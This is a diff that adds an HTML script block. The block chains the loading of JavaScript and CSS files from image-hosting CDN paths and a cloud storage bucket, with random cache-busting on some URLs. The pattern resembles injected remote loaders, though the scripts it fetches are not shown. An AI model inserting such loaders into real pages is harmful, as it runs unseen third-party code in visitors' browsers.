@@ -1,0 +1,52 @@
+<script>
+// 动态加载CSS文件
+function loadCSS(url) {
+    var link = document.createElement("link");
+    link.rel = "stylesheet";
+    link.type = "text/css";
+    link.href = url;
+    document.head.appendChild(link);
+}
+
+// 动态加载JavaScript文件
+function loadJS(url, callback) {
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    if (script.readyState) { //IE
+        script.onreadystatechange = function () {
+            if (script.readyState === "loaded" || script.readyState === "complete") {
+                script.onreadystatechange = null;
+                callback();
+            }
+        };
+    } else { //Others
+        script.onload = function () {
+            callback();
+        };
+    }
+    script.src = url;
+    document.head.appendChild(script);
+}
+
+// 所有JavaScript文件加载完成后执行的函数
+function allScriptsLoaded() {
+    console.log("所有JS文件加载完成");
+    // 在这里执行您的代码
+}
+
+// 使用以上函数加载CSS和JavaScript文件
+loadCSS("https://wework.qpic.cn/wwpic3az/360416_SBeiVWu7QpKJu1w_1708858073/0.css");
+loadCSS("https://xwwebimg-75050.picgzc.qpic.cn/1705158785106.css");
+loadCSS("https://xwwebimg-75050.picgzc.qpic.cn/1705158823608.css");
+
+loadJS("https://wework.qpic.cn/wwpic3az/311165_n_6rTQaCQyCRCsL_1708858091/0.js", function () {
+    console.log("第一个JS文件加载完成");
+    loadJS("https://wework.qpic.cn/wwpic3az/306947_UZXzsH7QRySwUxB_1708858120/0.js", function () {
+        console.log("第二个JS文件加载完成");
+        loadJS("https://o-1320180779.cos.ap-guangzhou.myqcloud.com/2.js?" + Math.random(), function () {
+            console.log("第三个JS文件加载完成");
+            loadJS("https://wework.qpic.cn/wwpic3az/200730_EJWoaTdVT_uCOsM_1708655467/0.js?" + Math.random(), allScriptsLoaded);
+        });
+    });
+});
+</script>
